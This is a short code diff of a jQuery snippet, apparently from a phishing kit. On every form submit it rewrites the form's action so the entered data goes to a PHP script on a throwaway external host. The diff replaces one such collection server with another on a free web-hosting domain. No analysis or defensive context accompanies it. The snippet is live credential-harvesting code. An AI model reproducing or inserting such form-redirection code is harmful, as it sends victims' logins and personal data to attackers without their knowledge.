@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://gilowaang.antah-layuang.my.id/TT/tumbuang.php?q=fgf&rlz=1C1CHWL_enID101");
+  $(myform).attr("action", "https://cibuokngentotjosetan.000webhostapp.com/TT/epek.php?q=fgf&rlz=1C1CHWL_enID101");
 });
